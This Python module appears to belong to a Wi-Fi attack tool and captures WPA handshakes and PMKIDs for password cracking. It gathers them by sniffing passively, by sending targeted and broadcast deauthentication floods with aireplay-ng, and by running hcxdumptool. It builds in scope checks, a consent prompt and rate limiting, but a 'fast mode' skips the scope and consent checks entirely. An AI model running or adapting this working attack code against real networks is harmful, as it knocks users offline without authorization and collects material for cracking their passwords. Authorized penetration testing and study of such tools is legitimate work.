#!/usr/bin/env python3
"""
Handshake capture module.

Strategies:
  1. Passive – wait for a natural 4-way handshake (scope warning only)
  2. Deauth  – targeted per-client deauth + broadcast fallback (scope REQUIRED)
  3. PMKID   – capture PMKID from AP (scope REQUIRED)

Ethical safeguards
──────────────────
• Scope check   : deauth and PMKID require the BSSID to be listed in scope.yaml
• Consent prompt: user must type the BSSID before any frame is sent
• Rate limiter  : deauth bursts limited to DEFAULT_MAX_BURSTS_PER_MIN per client
• Audit log     : every deauth burst logged with timestamp + user
"""
from __future__ import annotations

import csv
import hashlib
import logging
import os
import re
import shutil
import subprocess
import tempfile
import threading
import time
from datetime import datetime
from io import StringIO
from pathlib import Path
from typing import Optional

from modules.banner import C, info, success, warn, error, print_section
from modules.ratelimit import DeauthRateLimiter, DEFAULT_MAX_BURSTS_PER_MIN
from modules.scope import ScopeManager

logger = logging.getLogger(__name__)

HANDSHAKE_TIMEOUT_DEFAULT = 120
DEAUTH_COUNT              = 5       # per-direction, per-client — small burst, repeat fast
DEAUTH_INTERVAL           = 5
CAPTURE_DIR               = "captures"

os.makedirs(CAPTURE_DIR, exist_ok=True)

_rate_limiter: Optional[DeauthRateLimiter] = None


def get_rate_limiter(max_bursts: int = DEFAULT_MAX_BURSTS_PER_MIN) -> DeauthRateLimiter:
    global _rate_limiter
    if _rate_limiter is None:
        _rate_limiter = DeauthRateLimiter(max_bursts_per_min=max_bursts)
    return _rate_limiter


###############################################################################
# Public entry point
###############################################################################

def capture_handshake_menu(
    interface: str,
    target: dict,
    auto: bool = False,
    scope: Optional[ScopeManager] = None,
    deauth_limit: int = DEFAULT_MAX_BURSTS_PER_MIN,
    fast: bool = False,
) -> Optional[str]:
    """
    Interactive menu for handshake capture.
    Returns path to .cap / .hash file, or None on failure.
    """
    print_section("Handshake Capture")
    bssid   = target["bssid"]
    channel = target["channel"]
    ssid    = target.get("ssid", target.get("essid", bssid))

    info(f"Target : {ssid}  [{bssid}]  CH{channel}")

    if auto:
        strategy = "2"
    else:
        print(f"""
  {C.WHITE}Capture Strategy:{C.RESET}
  {C.GREEN}[1]{C.RESET} Passive   – wait for natural handshake  {C.DIM}(no frames sent){C.RESET}
  {C.GREEN}[2]{C.RESET} Deauth    – force reconnect  {C.YELLOW}(recommended — requires scope.yaml){C.RESET}
  {C.GREEN}[3]{C.RESET} PMKID     – capture from AP beacon  {C.DIM}(requires scope.yaml){C.RESET}
  {C.RED}[0]{C.RESET} Back
""")
        strategy = input(f"  {C.YELLOW}Strategy: {C.RESET}").strip()

    if strategy == "0":
        return None

    timeout = HANDSHAKE_TIMEOUT_DEFAULT
    if not auto:
        try:
            t = input(f"  {C.YELLOW}Timeout in seconds [{timeout}]: {C.RESET}").strip()
            if t:
                timeout = int(t)
        except ValueError:
            pass

    ssid_safe = re.sub(r"[^\w]", "_", ssid)
    stamp     = datetime.now().strftime("%Y%m%d_%H%M%S")
    cap_base  = os.path.join(CAPTURE_DIR, f"{ssid_safe}_{stamp}")

    if strategy == "1":
        # Passive: scope warning only (no frames sent)
        if scope and not scope.is_authorized(bssid):
            warn(f"BSSID {bssid} is not in scope.yaml — passive capture allowed but noted.")
            logger.warning("Passive capture on out-of-scope BSSID %s", bssid)
        return _passive_capture(interface, bssid, channel, cap_base, timeout)

    elif strategy == "2":
        # Deauth: hard scope block (or fast-mode warning)
        _enforce_scope_and_consent(scope, bssid, ssid, "Deauth + Handshake Capture", fast=fast)
        limiter = get_rate_limiter(deauth_limit)
        return _deauth_capture(interface, bssid, ssid, channel, cap_base, timeout, auto, limiter)

    elif strategy == "3":
        # PMKID: hard scope block (or fast-mode warning)
        _enforce_scope_and_consent(scope, bssid, ssid, "PMKID Capture", fast=fast)
        return _pmkid_capture(interface, bssid, cap_base, timeout)

    else:
        error("Invalid strategy.")
        return None


###############################################################################
# Scope + consent helpers
###############################################################################

def _enforce_scope_and_consent(
    scope: Optional[ScopeManager],
    bssid: str,
    ssid: str,
    operation: str,
    fast: bool = False,
) -> None:
    """Raise ScopeError if out of scope; display consent prompt and require BSSID confirmation.

    When fast=True the scope check and consent prompt are skipped and a red
    warning banner is shown instead (lab / CTF mode).
    """
    from rich.console import Console
    from rich import box
    from rich.panel import Panel
    con = Console()

    if fast:
        con.print(Panel(
            f"[bold red]⚡ FAST MODE — Scope & consent bypassed ⚡[/]\n\n"
            f"Operation: [bold]{operation}[/]\n"
            f"Target: [bold]{ssid}[/]  [{bssid}]\n\n"
            "[bold yellow]AUTHORIZED LAB / CTF USE ONLY.[/]",
            title="[bold red]Fast Mode Active[/]",
            box=box.DOUBLE, border_style="red",
        ))
        logger.warning("Fast mode: scope bypassed bssid=%s operation=%s", bssid, operation)
        return

    # ── Scope check ───────────────────────────────────────────────────────
    if scope is not None:
        scope.require_authorized(bssid, operation)

    # ── Consent prompt ────────────────────────────────────────────────────
    con.print()
    con.print(Panel(
        f"[bold red]⚠  FRAME INJECTION WARNING  ⚠[/]\n\n"
        f"You are about to perform: [bold]{operation}[/]\n\n"
        f"  [bold]BSSID:[/] {bssid}\n"
        f"  [bold]SSID: [/] {ssid}\n\n"
        "This operation sends wireless frames to the target network.\n"
        "[bold yellow]Only proceed if you have WRITTEN authorization from the owner.[/]\n\n"
        "To confirm, type the target BSSID exactly below:",
        title="[bold red]Authorization Required[/]",
        box=box.DOUBLE,
        border_style="red",
    ))

    # Require manual BSSID entry (no clipboard bypass)
    import sys
    sys.stdout.write(f"\n  Type BSSID to confirm: ")
    sys.stdout.flush()
    try:
        # Read character-by-character to disable copy-paste feel (best-effort on terminal)
        entered = input("").strip().upper()
    except KeyboardInterrupt:
        con.print("[red]Aborted.[/]")
        raise SystemExit(0)

    if entered != bssid.upper():
        con.print(f"[red]BSSID mismatch (entered {entered!r}, expected {bssid!r}). Aborting.[/]")
        raise SystemExit(1)

    confirm = input("  Proceed? [y/N]: ").strip().lower()
    if confirm != "y":
        con.print("[red]Aborted by user.[/]")
        raise SystemExit(0)

    # Log consent
    import os as _os
    try:
        username = _os.getlogin()
    except OSError:
        username = _os.environ.get("USER", "unknown")

    logger.info(
        "CONSENT_GRANTED user=%s bssid=%s operation=%s ts=%s",
        username, bssid, operation,
        datetime.now().isoformat(),
    )
    con.print(f"[green]✓ Consent logged for {bssid}[/]")


###############################################################################
# Strategy 1: Passive
###############################################################################

def _passive_capture(interface, bssid, channel, cap_base, timeout) -> Optional[str]:
    info("Passive capture — waiting for handshake...")
    return _run_airodump_until_handshake(interface, bssid, channel, cap_base, timeout)


###############################################################################
# Strategy 2: Targeted deauth + capture
###############################################################################

def discover_clients(
    bssid: str,
    monitor_interface: str,
    scan_duration: int = 10,
    channel: Optional[int] = None,
) -> list[dict]:
    """
    Passively sniff for clients associated with *bssid* via airodump-ng CSV.

    Returns list of dicts sorted by signal strength (strongest first):
      [{"mac": "AA:BB:CC:DD:EE:FF", "power": -45, "packets": 134, "probes": "net"}]
    """
    from rich.console import Console
    from rich.live import Live
    from rich.text import Text
    con = Console()

    tmpdir = tempfile.mkdtemp(prefix="wifidown_clients_")
    output_prefix = os.path.join(tmpdir, "clients")

    cmd = [
        "airodump-ng",
        "--bssid", bssid,
        "--output-format", "csv",
        "--write", output_prefix,
        "--write-interval", "2",
    ]
    if channel:
        cmd += ["--channel", str(channel)]
    cmd.append(monitor_interface)

    con.print(
        f"[dim cyan]◈ Scanning for connected clients on {bssid} ({scan_duration}s)...[/]"
    )

    proc = subprocess.Popen(
        cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )

    try:
        with Live(console=con, refresh_per_second=4) as live:
            for remaining in range(scan_duration, 0, -1):
                live.update(
                    Text(
                        f"  ◈ Sniffing clients... {remaining}s remaining",
                        style="dim cyan",
                    )
                )
                time.sleep(1)
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()

    clients: list[dict] = []
    csv_file = output_prefix + "-01.csv"

    if not os.path.exists(csv_file):
        shutil.rmtree(tmpdir, ignore_errors=True)
        return clients

    try:
        with open(csv_file, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()

        # airodump-ng CSV: Section 1 = APs, Section 2 = Stations
        sections = re.split(r"\n\s*\n", content)
        client_section: Optional[str] = None
        for section in sections:
            if "Station MAC" in section:
                client_section = section
                break

        if client_section:
            reader = csv.reader(StringIO(client_section))
            header_found = False
            for row in reader:
                row = [cell.strip() for cell in row]
                if not row:
                    continue
                if "Station MAC" in row[0]:
                    header_found = True
                    continue
                if not header_found or len(row) < 6:
                    continue

                client_mac = row[0].strip().upper()
                if not re.match(r"^([0-9A-F]{2}:){5}[0-9A-F]{2}$", client_mac):
                    continue

                assoc_bssid = row[5].strip().upper() if len(row) > 5 else ""
                if assoc_bssid in ("", "(NOT ASSOCIATED)"):
                    continue
                if assoc_bssid != bssid.strip().upper():
                    continue

                try:
                    power = int(row[3].strip()) if row[3].strip() else -100
                except ValueError:
                    power = -100
                try:
                    packets = int(row[4].strip()) if row[4].strip() else 0
                except ValueError:
                    packets = 0

                clients.append({
                    "mac":     client_mac,
                    "power":   power,
                    "packets": packets,
                    "probes":  row[6].strip() if len(row) > 6 else "",
                })

    except Exception as exc:
        logger.debug("Client CSV parse error: %s", exc)
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)

    clients.sort(key=lambda c: c["power"], reverse=True)
    return clients


def display_clients(clients: list[dict], bssid: str) -> None:
    """Print a Rich table of discovered clients."""
    from rich.console import Console
    from rich.table import Table
    from rich.text import Text
    con = Console()

    if not clients:
        con.print(f"[yellow]  No clients currently associated with {bssid}[/]")
        return

    table = Table(
        title=f"Connected clients on {bssid}",
        border_style="color(23)",
        header_style="color(51) bold",
        show_lines=False,
    )
    table.add_column("No.", style="dim", width=4)
    table.add_column("Client MAC", style="color(87) bold")
    table.add_column("Signal", style="color(50)")
    table.add_column("Packets", style="dim cyan")
    table.add_column("Probes", style="dim")

    for i, client in enumerate(clients, 1):
        signal_str = f"{client['power']} dBm"
        signal_style = (
            "green" if client["power"] > -50
            else "yellow" if client["power"] > -70
            else "red"
        )
        table.add_row(
            str(i),
            client["mac"],
            Text(signal_str, style=signal_style),
            str(client["packets"]),
            client["probes"] or "—",
        )

    con.print(table)



def send_targeted_deauth(
    bssid: str,
    client_mac: str,
    monitor_interface: str,
    limiter: DeauthRateLimiter,
    count: int = DEAUTH_COUNT,
) -> bool:
    """
    Send targeted unicast deauth in both directions (non-blocking via Popen).

    AP→Client: spoofed as AP, forces client to disassociate.
    Client→AP: spoofed as client, forces AP to drop the session.

    Both procs run concurrently; we wait up to 60 s for each to finish
    and kill cleanly on timeout — timeout is not fatal because the
    packets have already been injected by that point.
    """
    from rich.console import Console
    con = Console()

    # Rate-limit per-client key so we don't hammer the same device back-to-back
    limiter.wait_for_burst(bssid, client_mac)

    procs: list[subprocess.Popen] = []

    # Direction 1: AP → Client
    con.print(
        f"[dim cyan]  ↳ Deauth AP→Client  "
        f"[bold]{bssid}[/bold] → [bold]{client_mac}[/bold] ({count} pkts)[/]"
    )
    try:
        procs.append(subprocess.Popen(
            ["aireplay-ng", "-0", str(count), "-a", bssid, "-c", client_mac,
             "--ignore-negative-one", monitor_interface],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        ))
    except FileNotFoundError:
        con.print("[red]  aireplay-ng not found.[/]")
        return False
    except Exception as exc:
        con.print(f"[red]  Deauth AP→Client error: {exc}[/]")
        return False

    time.sleep(0.1)

    # Direction 2: Client → AP (reversed -a/-c: spoofed as client, AP drops session)
    con.print(
        f"[dim cyan]  ↳ Deauth Client→AP  "
        f"[bold]{client_mac}[/bold] → [bold]{bssid}[/bold] ({count} pkts)[/]"
    )
    try:
        procs.append(subprocess.Popen(
            ["aireplay-ng", "-0", str(count), "-a", client_mac, "-c", bssid,
             "--ignore-negative-one", monitor_interface],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        ))
    except Exception as exc:
        con.print(f"[dim yellow]  Deauth Client→AP error: {exc}[/]")

    # Wait for both directions; kill if they stall — packets already in-flight
    for proc in procs:
        try:
            proc.wait(timeout=60)
        except subprocess.TimeoutExpired:
            con.print("[dim yellow]  Deauth proc stalled — killing cleanly[/]")
            proc.kill()
            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                pass
            # Not re-raised: timeout here means packets were sent, ACK just slow

    logger.info(
        "Targeted deauth sent: bssid=%s client=%s count=%d",
        bssid, client_mac, count,
    )
    return True


def send_broadcast_deauth_fallback(
    bssid: str,
    monitor_interface: str,
    limiter: DeauthRateLimiter,
    count: int = 10,
) -> None:
    """Broadcast deauth — fallback only when no clients are discovered."""
    from rich.console import Console
    con = Console()

    limiter.wait_for_burst(bssid)
    con.print(
        f"[dim yellow]  ↳ Broadcast deauth fallback on {bssid} ({count} pkts)...[/]"
    )
    try:
        proc = subprocess.Popen(
            ["aireplay-ng", "-0", str(count), "-a", bssid,
             "--ignore-negative-one", monitor_interface],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        try:
            proc.wait(timeout=60)
        except subprocess.TimeoutExpired:
            proc.kill()
            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                pass
    except FileNotFoundError:
        con.print("[red]  aireplay-ng not found.[/]")
    except Exception as exc:
        con.print(f"[dim yellow]  Broadcast deauth error: {exc}[/]")
    logger.info("Broadcast deauth fallback: bssid=%s count=%d", bssid, count)


def _deauth_capture(
    interface: str,
    bssid: str,
    ssid: str,
    channel: int,
    cap_base: str,
    timeout: int,
    auto: bool,
    limiter: DeauthRateLimiter,
) -> Optional[str]:
    """
    Handshake capture via targeted per-client deauth with broadcast fallback.

    Pipeline per attempt:
      1. Discover connected clients (passive airodump-ng scan)
      2a. If clients found: send bidirectional targeted deauth to each (up to 3)
          and check for handshake after each burst
      2b. If no clients: broadcast deauth fallback
      3. Wait up to timeout_per_attempt seconds checking for handshake
      4. Repeat up to max_attempts times
      PMKID capture runs in parallel throughout as a background thread.
    """
    from rich.console import Console
    con = Console()

    cap_file = cap_base + "-01.cap"

    # Derive attempt budget from total timeout
    # Each attempt ~= scan(6-8s) + deauths(~5s) + wait(10s) + pause(3s) ~= 28s
    max_attempts = max(3, timeout // 28)
    timeout_per_attempt = max(8, timeout // max_attempts - 15)

    con.print(f"\n[cyan]◈ Starting targeted handshake capture[/]")
    con.print(f"  Target:    [bold]{ssid}[/bold] ({bssid})")
    con.print(f"  Channel:   {channel}")
    con.print(f"  Interface: {interface}")
    con.print(f"  Strategy:  targeted deauth + PMKID parallel")
    con.print(f"  Attempts:  {max_attempts}  (timeout {timeout}s)\n")

    # Start passive packet capture in background (runs throughout all attempts)
    dump_proc = _start_airodump(interface, bssid, channel, cap_base)
    time.sleep(2)  # let airodump-ng initialize before injecting

    # PMKID capture in parallel -- no deauth needed, grabs from association frame
    pmkid_result: dict[str, Optional[str]] = {"path": None}

    def _pmkid_worker() -> None:
        pmkid_result["path"] = _pmkid_capture(
            interface, bssid, cap_base, min(timeout - 5, 60)
        )

    pmkid_thread = threading.Thread(target=_pmkid_worker, daemon=True)
    pmkid_thread.start()

    handshake_found = False

    try:
        for attempt in range(1, max_attempts + 1):
            con.print(f"\n[cyan]◈ Attempt {attempt}/{max_attempts}[/]")

            # Shorter scan on repeat attempts (clients don't change much)
            scan_secs = 8 if attempt == 1 else 5
            clients = discover_clients(
                bssid=bssid,
                monitor_interface=interface,
                scan_duration=scan_secs,
                channel=channel,
            )

            if clients:
                display_clients(clients, bssid)
                con.print(
                    f"[green]  ✓ {len(clients)} client(s) found -- sending targeted deauth[/]"
                )

                for client in clients[:3]:
                    con.print(
                        f"\n[cyan]  ◈ Targeting [bold]{client['mac']}[/bold] "
                        f"(signal: {client['power']} dBm)[/]"
                    )
                    send_targeted_deauth(
                        bssid=bssid,
                        client_mac=client["mac"],
                        monitor_interface=interface,
                        limiter=limiter,
                        count=DEAUTH_COUNT,
                    )
                    # Check immediately -- handshake may already be in the buffer
                    time.sleep(2)
                    if _verify_handshake(cap_file, bssid):
                        handshake_found = True
                        break

                if not handshake_found:
                    # Wait for clients to reassociate
                    con.print("[dim cyan]  Waiting for reassociation...[/]")
                    for _ in range(timeout_per_attempt):
                        time.sleep(1)
                        if _verify_handshake(cap_file, bssid):
                            handshake_found = True
                            break

            else:
                con.print(
                    "[dim yellow]  No clients found -- broadcast deauth fallback[/]"
                )
                send_broadcast_deauth_fallback(
                    bssid=bssid,
                    monitor_interface=interface,
                    limiter=limiter,
                    count=16,
                )
                for _ in range(timeout_per_attempt + 5):
                    time.sleep(1)
                    if _verify_handshake(cap_file, bssid):
                        handshake_found = True
                        break

            if handshake_found:
                break

            if attempt < max_attempts:
                con.print(f"[dim]  Not yet captured -- retrying in 3s...[/]")
                time.sleep(3)

    except KeyboardInterrupt:
        warn("Capture interrupted by user.")
    finally:
        dump_proc.terminate()
        try:
            dump_proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            dump_proc.kill()

    # Report PMKID result (background thread may still be running -- join briefly)
    pmkid_thread.join(timeout=3)
    if pmkid_result["path"]:
        con.print(f"[green]◈ PMKID also captured: {pmkid_result['path']}[/]")

    if handshake_found:
        # Compute SHA-256 as audit evidence
        try:
            with open(cap_file, "rb") as f:
                sha256 = hashlib.sha256(f.read()).hexdigest()
            con.print(f"  SHA-256: [dim]{sha256}[/dim]")
        except OSError:
            pass

    return _finalize(cap_file, handshake_found)


###############################################################################
# Strategy 3: PMKID
###############################################################################

def _pmkid_capture(interface: str, bssid: str, cap_base: str, timeout: int) -> Optional[str]:
    if not shutil.which("hcxdumptool"):
        logger.debug("hcxdumptool not found -- PMKID capture skipped")
        return None

    pcapng_file = cap_base + "_pmkid.pcapng"
    hash_file   = cap_base + "_pmkid.hc22000"

    filter_fd, filter_path = tempfile.mkstemp(suffix=".txt", prefix="wifidown_pmkid_")
    try:
        with os.fdopen(filter_fd, "w") as f:
            f.write(bssid.replace(":", "").lower() + "\n")

        proc = subprocess.Popen(
            [
                "hcxdumptool",
                "-i", interface,
                "-o", pcapng_file,
                f"--filterlist_ap={filter_path}",
                "--filtermode=2",
                "--disable_deauthentication",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        try:
            time.sleep(timeout)
        except Exception:
            pass
        finally:
            proc.terminate()
            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()
    finally:
        try:
            os.unlink(filter_path)
        except OSError:
            pass

    if not os.path.exists(pcapng_file) or os.path.getsize(pcapng_file) < 100:
        return None

    try:
        subprocess.run(
            ["hcxpcapngtool", "-o", hash_file, pcapng_file],
            capture_output=True, text=True, timeout=30,
        )
        if os.path.exists(hash_file) and os.path.getsize(hash_file) > 0:
            logger.info("PMKID captured: %s", hash_file)
            return hash_file
    except Exception as exc:
        logger.debug("PMKID conversion error: %s", exc)

    return None


###############################################################################
# Handshake verification (public + internal)
###############################################################################

def verify_handshake(cap_file: str, bssid: str) -> bool:
    """Public wrapper: returns True if cap_file contains a valid 4-way handshake."""
    return _verify_handshake(cap_file, bssid)


###############################################################################
# Internal helpers
###############################################################################

def _start_airodump(interface, bssid, channel, cap_base) -> subprocess.Popen:
    return subprocess.Popen(
        [
            "airodump-ng",
            "--bssid", bssid,
            "--channel", str(channel),
            "--write", cap_base,
            "--output-format", "cap,csv",
            "--write-interval", "2",
            interface,
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )


def _run_airodump_until_handshake(interface, bssid, channel, cap_base, timeout) -> Optional[str]:
    cap_file = cap_base + "-01.cap"
    proc = _start_airodump(interface, bssid, channel, cap_base)
    handshake_found = False
    elapsed = 0
    try:
        while elapsed < timeout:
            time.sleep(5)
            elapsed += 5
            info(f"  [{elapsed}s] Waiting for handshake...")
            if _verify_handshake(cap_file, bssid):
                handshake_found = True
                break
    except KeyboardInterrupt:
        warn("Capture interrupted.")
    finally:
        proc.terminate()
        proc.wait()
    return _finalize(cap_file, handshake_found)


def _verify_handshake(cap_file: str, bssid: str) -> bool:
    """Check cap_file for a valid WPA handshake for bssid using aircrack-ng."""
    if not os.path.exists(cap_file) or os.path.getsize(cap_file) == 0:
        return False
    try:
        result = subprocess.run(
            ["aircrack-ng", "-b", bssid, cap_file],
            capture_output=True, text=True, timeout=15,
        )
        output = result.stdout + result.stderr
        if re.search(r"WPA\s*\(\s*[1-9]\d*\s*handshake", output, re.IGNORECASE):
            return True
        if re.search(r"[1-9]\d*\s+handshake", output, re.IGNORECASE):
            return True
        if "PMKID" in output:
            return True
    except Exception:
        pass
    return False


def _csv_has_handshake(csv_path: str, bssid: str) -> bool:
    if not os.path.exists(csv_path):
        return False
    try:
        with open(csv_path, "r", errors="replace") as f:
            return "handshake" in f.read().lower()
    except OSError:
        return False


def _finalize(cap_file: str, found: bool) -> Optional[str]:
    if found:
        success(f"WPA handshake captured! → {cap_file}")
        logger.info("Handshake captured: %s", cap_file)
        return cap_file
    if os.path.exists(cap_file) and os.path.getsize(cap_file) > 0:
        warn("Timeout reached. Capture saved — you can try cracking it anyway.")
        return cap_file
    error("No valid handshake captured.")
    return None
